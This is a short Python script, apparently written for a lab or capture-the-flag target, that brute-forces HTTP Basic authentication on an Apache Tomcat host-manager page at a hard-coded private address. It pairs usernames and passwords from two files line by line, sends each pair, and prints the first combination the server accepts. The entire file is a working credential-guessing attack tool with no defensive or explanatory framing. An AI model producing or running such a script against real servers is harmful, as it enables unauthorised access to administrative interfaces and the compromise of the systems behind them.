import sys
import requests
from base64 import b64encode,b64decode


def combine_files(file1, file2):
    with open(file1, 'r') as f1, open(file2, 'r') as f2:
        lines1 = f1.readlines()
        lines2 = f2.readlines()

        for line1, line2 in zip(lines1, lines2):
            username = line1.strip()
            password = line2.strip()
            #print(f"{username}:{password}")
            auth_value = b64encode(f"{username}:{password}".encode('utf-8')).decode('utf-8')
            header = {'Authorization': f'Basic {auth_value}'}
            req = requests.get('http://192.168.0.101:8080/host-manager/html', headers=header)
            #print(auth_value, req)
            if req.ok:
            	decoded = b64decode(auth_value).decode('utf-8')
            	print('Username:Password -', decoded)
            	break
            

    #print(type(auth_value))


if __name__ == "__main__":
    file1 = sys.argv[1]
    file2 = sys.argv[2]

    combine_files(file1, file2)
